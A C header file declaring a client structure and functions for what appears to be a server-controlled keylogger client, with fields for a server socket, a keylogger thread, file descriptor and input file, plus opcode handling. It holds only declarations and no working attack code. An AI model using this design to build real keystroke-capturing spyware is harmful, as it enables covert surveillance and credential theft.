#pragma once
#include <sys/socket.h>
#include <pthread.h>
#include "messageManager.h"

struct clientInfo
{
    char name[BUFFER_SIZE];
    int serverSocket;
    int isKeyLoggerActive;
    pthread_t keyLoggerTid;
    int keyLoggerFd;
    char keyLoggerInputFile[BUFFER_SIZE];
};

typedef struct clientInfo clientInfo_t;

void connectionInitialize(int *sock);

void startingDataInitialize();

void handleOpcode(message_t msg);